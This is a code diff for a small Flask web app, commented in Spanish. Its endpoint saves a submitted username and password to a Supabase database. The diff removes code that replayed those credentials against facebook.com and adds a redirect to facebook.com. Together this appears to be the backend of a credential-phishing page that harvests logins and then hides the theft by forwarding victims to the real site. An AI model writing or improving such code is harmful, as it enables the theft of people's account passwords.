@@ -1,6 +1,6 @@
-from flask import Flask, request, render_template, jsonify
+from flask import Flask, request, render_template, jsonify, redirect
 from supabase import create_client, Client
-import requests  # Para realizar el login a otra página web
+import requests
 
 app = Flask(__name__)
 
@@ -33,18 +33,8 @@ def save_data():
         if response.get("status_code") != 200:
             return jsonify({"status": "error", "message": "Failed to save data"}), 500
 
-        # 2. Realizar login en otra página web
-        login_url = "https://www.facebook.com/"  # URL de login de la web deseada
-        login_payload = {"username": username, "password": password}  # Cambiar según los campos esperados por la web
-        login_headers = {"Content-Type": "application/x-www-form-urlencoded"}  # Cambiar si la web usa otro formato
-
-        # Realizar la solicitud POST
-        login_response = requests.post(login_url, data=login_payload, headers=login_headers)
-
-        if login_response.status_code == 200:
-            return jsonify({"status": "success", "message": "Data saved and login successful"})
-        else:
-            return jsonify({"status": "error", "message": "Login failed on external site"}), 401
+        # 2. Redirigir al usuario a la página web deseada
+        return redirect("https://www.facebook.com/")  # URL de la web donde deseas redirigir
 
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
